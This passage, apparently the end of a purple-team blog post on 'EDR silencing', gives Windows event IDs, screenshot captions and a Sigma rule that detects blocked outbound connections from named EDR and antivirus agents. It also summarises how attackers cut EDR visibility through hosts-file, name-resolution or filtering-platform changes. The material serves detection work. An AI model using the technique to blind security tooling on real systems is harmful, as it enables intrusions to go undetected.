<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th class="has-text-align-center" data-align="center">Action</th><th class="has-text-align-center" data-align="center">Event ID</th></tr></thead><tbody><tr><td class="has-text-align-center" data-align="center">Handle Request</td><td class="has-text-align-center" data-align="center">4656</td></tr><tr><td class="has-text-align-center" data-align="center">Object Access</td><td class="has-text-align-center" data-align="center">4663</td></tr><tr><td class="has-text-align-center" data-align="center">Registry Value Modification</td><td class="has-text-align-center" data-align="center">4657</td></tr><tr><td class="has-text-align-center" data-align="center">IPSec Policy Agent Applied</td><td class="has-text-align-center" data-align="center">5460</td></tr><tr><td class="has-text-align-center" data-align="center">IPSec Policy Agent Loaded</td><td class="has-text-align-center" data-align="center">5471</td></tr></tbody></table></figure>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1748" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-ipsec-policy-agent-loaded/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-policy-agent-loaded.png" data-orig-size="1024,874" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; IPSec Policy Agent Loaded" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-policy-agent-loaded.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-policy-agent-loaded.png?w=1024" loading="lazy" width="1024" height="874" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-policy-agent-loaded.png?w=1024" alt="" class="wp-image-1748"><figcaption class="wp-element-caption"><em>IPSec Policy Agent Loaded</em></figcaption></figure>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1750" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-ipsec-policy-agent/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-policy-agent.png" data-orig-size="1048,852" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; IPSec Policy Agent" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-policy-agent.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-policy-agent.png?w=1024" loading="lazy" width="1024" height="832" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-policy-agent.png?w=1024" alt="" class="wp-image-1750"><figcaption class="wp-element-caption"><em>IPSec Policy Agent Event ID</em></figcaption></figure>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1752" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-ipsec-filters-request-handle/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-request-handle.png" data-orig-size="1224,864" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; IPSec Filters Request Handle" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-request-handle.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-request-handle.png?w=1024" loading="lazy" width="1024" height="722" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-request-handle.png?w=1024" alt="" class="wp-image-1752"><figcaption class="wp-element-caption"><em>IPSec – Request Handle</em></figcaption></figure>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1754" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-ipsec-filters-access-object/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-access-object.png" data-orig-size="1264,874" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; IPSec Filters Access Object" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-access-object.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-access-object.png?w=1024" loading="lazy" width="1024" height="708" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-access-object.png?w=1024" alt="" class="wp-image-1754"><figcaption class="wp-element-caption"><em>IPSec – Access Object</em></figcaption></figure>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1756" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-ipsec-filters-registry-key-modification/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-registry-key-modification.png" data-orig-size="1261,879" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; IPSec Filters Registry Key Modification" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-registry-key-modification.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-registry-key-modification.png?w=1024" loading="lazy" width="1024" height="713" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-registry-key-modification.png?w=1024" alt="" class="wp-image-1756"><figcaption class="wp-element-caption"><em>IPSec – Registry Key Modification</em></figcaption></figure>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1758" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-ipsec-filters-process-access-registry-key/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-process-access-registry-key.png" data-orig-size="1230,877" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; IPSec Filters Process Access Registry Key" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-process-access-registry-key.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-process-access-registry-key.png?w=1024" loading="lazy" width="1024" height="730" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-process-access-registry-key.png?w=1024" alt="" class="wp-image-1758"><figcaption class="wp-element-caption"><em>IPSec – Process Access Registry Key</em></figcaption></figure>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1760" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-ipsec-filters-registry-key/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-registry-key.png" data-orig-size="1212,862" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; IPSec Filters Registry Key" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-registry-key.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-registry-key.png?w=1024" loading="lazy" width="1024" height="728" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-registry-key.png?w=1024" alt="" class="wp-image-1760"><figcaption class="wp-element-caption"><em>IPSec Registry Key Modification</em></figcaption></figure>



<h3 class="wp-block-heading">SIGMA</h3>


<div class="wp-block-syntaxhighlighter-code "><div><div id="highlighter_675129" class="syntaxhighlighter  yaml"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="yaml variable">title:</code> <code class="yaml plain">WFP Blocked Outbound Connection From Common EDR Agent Binary</code></div><div class="line number2 index1 alt1"><code class="yaml variable">id:</code> <code class="yaml plain">6b2b5db7-8f7e-4b6e-b9d4-29f0a9edc0d1</code></div><div class="line number3 index2 alt2"><code class="yaml variable">status:</code> <code class="yaml plain">Production</code></div><div class="line number4 index3 alt1"><code class="yaml variable">description:</code> <code class="yaml plain">Detects Windows Filtering Platform blocked connection events (5157) for common EDR/AV agent processes</code><code class="yaml constants">,</code> <code class="yaml plain">which may indicate EDR silencing via WFP filters.</code></div><div class="line number5 index4 alt2"><code class="yaml variable">references:</code></div><div class="line number6 index5 alt1"><code class="yaml spaces">&nbsp;&nbsp;</code><code class="yaml string bold">-</code> <code class="yaml plain">https</code><code class="yaml constants">:</code><code class="yaml plain">//github.com/netero1010/EDRSilencer</code></div><div class="line number7 index6 alt2"><code class="yaml variable">author:</code> <code class="yaml plain">Panos Gkatziroulis</code></div><div class="line number8 index7 alt1"><code class="yaml variable">date:</code> <code class="yaml plain">2026-01-06</code></div><div class="line number9 index8 alt2"><code class="yaml variable">tags:</code></div><div class="line number10 index9 alt1"><code class="yaml spaces">&nbsp;&nbsp;</code><code class="yaml string bold">-</code> <code class="yaml plain">attack.defense-evasion</code></div><div class="line number11 index10 alt2"><code class="yaml spaces">&nbsp;&nbsp;</code><code class="yaml string bold">-</code> <code class="yaml plain">attack.t1562</code></div><div class="line number12 index11 alt1"><code class="yaml variable">logsource:</code></div><div class="line number13 index12 alt2"><code class="yaml spaces">&nbsp;&nbsp;</code><code class="yaml variable">product:</code> <code class="yaml plain">windows</code></div><div class="line number14 index13 alt1"><code class="yaml spaces">&nbsp;&nbsp;</code><code class="yaml variable">service:</code> <code class="yaml plain">security</code></div><div class="line number15 index14 alt2"><code class="yaml variable">detection:</code></div><div class="line number16 index15 alt1"><code class="yaml spaces">&nbsp;&nbsp;</code><code class="yaml variable">selection:</code></div><div class="line number17 index16 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml variable">EventID:</code> <code class="yaml color2 bold">5157</code></div><div class="line number18 index17 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml plain">Direction|contains</code><code class="yaml constants">:</code> <code class="yaml string">'Outbound'</code></div><div class="line number19 index18 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml plain">Application|endswith</code><code class="yaml constants">:</code></div><div class="line number20 index19 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string bold">-</code> <code class="yaml string">'\MsSense.exe'</code></div><div class="line number21 index20 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string bold">-</code> <code class="yaml string">'\SenseIR.exe'</code></div><div class="line number22 index21 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string bold">-</code> <code class="yaml string">'\SenseCncProxy.exe'</code></div><div class="line number23 index22 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string bold">-</code> <code class="yaml string">'\SenseNdr.exe'</code></div><div class="line number24 index23 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string bold">-</code> <code class="yaml string">'\MsMpEng.exe'</code></div><div class="line number25 index24 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string bold">-</code> <code class="yaml string">'\NisSrv.exe'</code></div><div class="line number26 index25 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string bold">-</code> <code class="yaml string">'\CSFalconService.exe'</code></div><div class="line number27 index26 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string bold">-</code> <code class="yaml string">'\CylanceSvc.exe'</code></div><div class="line number28 index27 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string bold">-</code> <code class="yaml string">'\elastic-agent.exe'</code></div><div class="line number29 index28 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string bold">-</code> <code class="yaml string">'\elastic-endpoint.exe'</code></div><div class="line number30 index29 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string bold">-</code> <code class="yaml string">'\SentinelAgent.exe'</code></div><div class="line number31 index30 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string bold">-</code> <code class="yaml string">'\TaniumClient.exe'</code></div><div class="line number32 index31 alt1"><code class="yaml spaces">&nbsp;&nbsp;</code><code class="yaml variable">condition:</code> <code class="yaml plain">selection</code></div><div class="line number33 index32 alt2"><code class="yaml variable">falsepositives:</code></div><div class="line number34 index33 alt1"><code class="yaml spaces">&nbsp;&nbsp;</code><code class="yaml string bold">-</code> <code class="yaml plain">Legitimate firewall policy blocks or troubleshooting</code></div><div class="line number35 index34 alt2"><code class="yaml spaces">&nbsp;&nbsp;</code><code class="yaml string bold">-</code> <code class="yaml plain">Temporary EDR backend outages coupled with local policy changes</code></div><div class="line number36 index35 alt1"><code class="yaml variable">level:</code> <code class="yaml plain">high</code></div></div></td></tr></tbody></table></div></div></div>


<p class="has-text-align-justify wp-block-paragraph">EDR Silencing is a technique that enables threat actors with elevated privileges on the asset to restrict endpoint detection and response visibility in order to execute less opsec oriented techniques. Changes to the <em>hosts</em> file, to the name resolution policy table or creation of Windows Filtering Platform rules should be considered critical for any organization. SOC teams should ensure that all the associated registry keys are monitored, and detection rules are developed and deployed. From the perspective of establishing resilience against this threat, the related procedures could be detected with high confidence if organizations are prepared to enable the required visibility.</p>



<p class="wp-block-paragraph"></p>
<div id="jp-post-flair" class="sharedaddy sd-like-enabled"><div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul data-sharing-events-added="true"><li class="share-x"><a rel="nofollow noopener noreferrer" data-shared="sharing-x-1608" class="share-x sd-button share-icon" href="https://ipurple.team/2026/01/12/edr-silencing/?share=x&amp;nb=1" target="_blank" aria-labelledby="sharing-x-1608">
				<span id="sharing-x-1608">Share on X (Opens in new window)</span>
				<span>X</span>
			</a></li><li class="share-email share-service-visible"><a rel="nofollow noopener noreferrer" data-shared="sharing-email-1608" class="share-email sd-button share-icon" href="mailto:?subject=%5BShared%20Post%5D%20EDR%20Silencing&amp;body=https%3A%2F%2Fipurple.team%2F2026%2F01%2F12%2Fedr-silencing%2F&amp;share=email&amp;nb=1" target="_blank" aria-labelledby="sharing-email-1608" data-email-share-error-title="Do you have email set up?" data-email-share-error-text="If you're having problems sharing via email, you might not have email set up for your browser. You may need to create a new email yourself." data-email-share-nonce="9282ade8b9" data-email-share-track-url="https://ipurple.team/2026/01/12/edr-silencing/?share=email" jetpack-share-click-count="0">
				<span id="sharing-email-1608">Email a link to a friend (Opens in new window)</span>
				<span>Email</span>
			</a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-1608" class="share-linkedin sd-button share-icon" href="https://ipurple.team/2026/01/12/edr-silencing/?share=linkedin&amp;nb=1" target="_blank" aria-labelledby="sharing-linkedin-1608">
				<span id="sharing-linkedin-1608">Share on LinkedIn (Opens in new window)</span>
				<span>LinkedIn</span>
			</a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-1608" class="share-facebook sd-button share-icon" href="https://ipurple.team/2026/01/12/edr-silencing/?share=facebook&amp;nb=1" target="_blank" aria-labelledby="sharing-facebook-1608">
				<span id="sharing-facebook-1608">Share on Facebook (Opens in new window)</span>
				<span>Facebook</span>
			</a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="sharing-reddit-1608" class="share-reddit sd-button share-icon" href="https://ipurple.team/2026/01/12/edr-silencing/?share=reddit&amp;nb=1" target="_blank" aria-labelledby="sharing-reddit-1608">
				<span id="sharing-reddit-1608">Share on Reddit (Opens in new window)</span>
				<span>Reddit</span>
			</a></li><li class="share-mastodon"><a rel="nofollow noopener noreferrer" data-shared="sharing-mastodon-1608" class="share-mastodon sd-button share-icon" href="https://ipurple.team/2026/01/12/edr-silencing/?share=mastodon&amp;nb=1" target="_blank" aria-labelledby="sharing-mastodon-1608">
				<span id="sharing-mastodon-1608">Share on Mastodon (Opens in new window)</span>
				<span>Mastodon</span>
			</a></li><li><a href="https://ipurple.team/2026/01/12/edr-silencing/#" class="sharing-anchor sd-button share-more"><span>More</span></a></li><li class="share-end"></li></ul><div class="sharing-hidden"><div class="inner" style="display: none;width:150px;" data-sharing-more-button-id="0"><ul style="background-image:none;" data-sharing-events-added="true"><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-1608" class="share-twitter sd-button share-icon" href="https://ipurple.team/2026/01/12/edr-silencing/?share=twitter&amp;nb=1" target="_blank" aria-labelledby="sharing-twitter-1608">
				<span id="sharing-twitter-1608">Share on X (Opens in new window)</span>
				<span>X</span>
			</a></li><li class="share-end"></li></ul></div></div></div></div></div><div class="sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded" id="like-post-wrapper-225397078-1608-699468b8b60ab" data-src="//widgets.wp.com/likes/index.html?ver=20260217#blog_id=225397078&amp;post_id=1608&amp;origin=ipurpleteam.wordpress.com&amp;obj_id=225397078-1608-699468b8b60ab&amp;domain=ipurple.team" data-name="like-post-frame-225397078-1608-699468b8b60ab" data-title="Like or Reblog"><div class="likes-widget-placeholder post-likes-widget-placeholder" style="height: 55px;"><span class="button"><span>Like</span></span> <span class="loading">Loading…</span></div><span class="sd-text-color"></span><a class="sd-link-color"></a></div></div></div></div>



<div class="wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
<div class="wp-block-comments" style="margin-top:var(--wp--preset--spacing--70)"><h2 id="comments" class="wp-elements-e010b06bf8f5d4aedaf4a209796c5a3e wp-block-comments-title has-text-color has-tertiary-color has-background has-primary-background-color">One response to “EDR Silencing”</h2>

<ol class="wp-block-comment-template"><li id="comment-46" class="comment even thread-even depth-1">

<div class="wp-block-columns is-not-stacked-on-mobile is-layout-flex wp-container-core-columns-is-layout-2d1730f3 wp-block-columns-is-layout-flex">
<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow" style="flex-basis:40px"><div class="wp-block-avatar"><img referrerpolicy="no-referrer" alt="Koifsec Avatar" src="https://0.gravatar.com/avatar/99173d9dea255831962113da6f27f461f9c47e028545a01ea0ca6898635ec328?s=40&amp;d=identicon&amp;r=G" class="avatar avatar-40 wp-block-avatar__image wp-hovercard-attachment grav-hashed grav-hijack" height="40" width="40" loading="lazy" decoding="async"></div></div>



<div class="wp-block-column is-layout-flow wp-container-core-column-is-layout-339f7bcf wp-block-column-is-layout-flow">
<div class="wp-block-group is-layout-flex wp-container-core-group-is-layout-fea38e88 wp-block-group-is-layout-flex" style="margin-top:0px;margin-bottom:0px"><div class="wp-block-comment-author-name">Koifsec</div>

<div class="wp-block-comment-date"><time datetime="2026-01-12T17:28:59+02:00">January 12, 2026</time></div>

</div>


<div class="wp-block-comment-content"><p class="wp-block-paragraph">A highly enjoyable read, super in-depth with a lot to take home. Thanks!</p>
<p id="comment-like-46" data-liked="comment-not-liked" class="comment-likes comment-not-liked"><a href="https://ipurple.team/2026/01/12/edr-silencing/?like_comment=46&amp;_wpnonce=f5c5c4ba03" class="comment-like-link needs-login" rel="nofollow" data-blog="225397078"><span>Like</span></a><span id="comment-like-count-46" class="comment-like-feedback">Like</span></p>
</div>

<div class="wp-block-comment-reply-link"><a rel="nofollow" class="comment-reply-link" href="https://ipurple.team/2026/01/12/edr-silencing/comment-page-1/?replytocom=46#respond" data-commentid="46" data-postid="1608" data-belowelement="comment-46" data-respondelement="respond" data-replyto="Reply to Koifsec" aria-label="Reply to Koifsec">Reply</a></div></div>
</div>

</li></ol>



	<div id="respond" class="comment-respond has-link-color wp-elements-3987f5ca653c4daab60edd7234eb166e wp-block-post-comments-form has-text-color has-tertiary-color has-background has-primary-background-color">
		<h3 id="reply-title" class="comment-reply-title">Leave a comment <small><a rel="nofollow" id="cancel-comment-reply-link" href="https://ipurple.team/2026/01/12/edr-silencing/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://ipurple.team/wp-comments-post.php" method="post" id="commentform" class="comment-form">



<div class="comment-form__verbum transparent"></div><div class="verbum-form-meta">


			
			</div><p style="display: none;"></p><p style="display: none !important;" class="akismet-fields-container" data-prefix="ak_"><label>Δ<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label>
</p></form>	</div><!-- #respond -->
	</div>
</div>



<div class="wp-block-group has-tertiary-color has-text-color has-link-color wp-elements-8cc30f3c507065c8b347cfa2170f1d5e has-global-padding is-layout-constrained wp-block-group-is-layout-constrained" style="margin-top:var(--wp--preset--spacing--60)">
<div class="wp-block-group is-content-justification-space-between is-nowrap is-layout-flex wp-container-core-group-is-layout-aecfe548 wp-block-group-is-layout-flex"><div class="post-navigation-link-previous wp-elements-2b1558954f7a08b4dd692f1a2b8afad2 wp-block-post-navigation-link has-text-color has-secondary-color"><span class="post-navigation-link__label">Previous Post<br></span> <a href="https://ipurple.team/2025/12/01/bind-link-edr-tampering/" rel="prev">Bind Link – EDR&nbsp;Tampering</a></div>

<div class="post-navigation-link-next has-text-align-right wp-elements-80233bf772d90eebb5fe702e9bc1c907 wp-block-post-navigation-link has-text-color has-secondary-color"><a href="https://ipurple.team/2026/02/02/applocker-rules-abuse/" rel="next">AppLocker Rules Abuse</a><span class="wp-block-post-navigation-link__arrow-next is-arrow-arrow" aria-hidden="true">→</span></div></div>
</div>
</main>


</div>
<!-- wpcom_wp_footer -->






	

		<div style="display:none">
	<div class="grofile-hash-map-4605db59f0637ffc3e084bd14d744ff7">
	</div>
	<div class="grofile-hash-map-7f9ffdda1b494e354079f36dcf3b1193">
	</div>
	</div>
		<div id="jp-carousel-loading-overlay">
			<div id="jp-carousel-loading-wrapper">
				<span id="jp-carousel-library-loading">&nbsp;</span>
			</div>
		</div>
		<div class="jp-carousel-overlay" style="display: none;">

		<div class="jp-carousel-container">
			<!-- The Carousel Swiper -->
			<div class="jp-carousel-wrap swiper jp-carousel-swiper-container jp-carousel-transitions" itemscope="" itemtype="https://schema.org/ImageGallery">
				<div class="jp-carousel swiper-wrapper"></div>
				<div class="jp-swiper-button-prev swiper-button-prev">
					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
						<mask id="maskPrev" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="9" height="12">
							<path d="M16.2072 16.59L11.6496 12L16.2072 7.41L14.8041 6L8.8335 12L14.8041 18L16.2072 16.59Z" fill="white"></path>
						</mask>
						<g mask="url(#maskPrev)">
							<rect x="0.579102" width="23.8823" height="24" fill="#FFFFFF"></rect>
						</g>
					</svg>
				</div>
				<div class="jp-swiper-button-next swiper-button-next">
					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
						<mask id="maskNext" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="8" height="12">
							<path d="M8.59814 16.59L13.1557 12L8.59814 7.41L10.0012 6L15.9718 12L10.0012 18L8.59814 16.59Z" fill="white"></path>
						</mask>
						<g mask="url(#maskNext)">
							<rect x="0.34375" width="23.8822" height="24" fill="#FFFFFF"></rect>
						</g>
					</svg>
				</div>
			</div>
			<!-- The main close buton -->
			<div class="jp-carousel-close-hint">
				<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
					<mask id="maskClose" mask-type="alpha" maskUnits="userSpaceOnUse" x="5" y="5" width="15" height="14">
						<path d="M19.3166 6.41L17.9135 5L12.3509 10.59L6.78834 5L5.38525 6.41L10.9478 12L5.38525 17.59L6.78834 19L12.3509 13.41L17.9135 19L19.3166 17.59L13.754 12L19.3166 6.41Z" fill="white"></path>
					</mask>
					<g mask="url(#maskClose)">
						<rect x="0.409668" width="23.8823" height="24" fill="#FFFFFF"></rect>
					</g>
				</svg>
			</div>
			<!-- Image info, comments and meta -->
			<div class="jp-carousel-info">
				<div class="jp-carousel-info-footer">
					<div class="jp-carousel-pagination-container">
						<div class="jp-swiper-pagination swiper-pagination"></div>
						<div class="jp-carousel-pagination"></div>
					</div>
					<div class="jp-carousel-photo-title-container">
						<h2 class="jp-carousel-photo-caption"></h2>
					</div>
					<div class="jp-carousel-photo-icons-container">
						<a href="https://ipurple.team/2026/01/12/edr-silencing/#" class="jp-carousel-icon-btn jp-carousel-icon-info" aria-label="Toggle photo metadata visibility">
							<span class="jp-carousel-icon">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="maskInfo" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
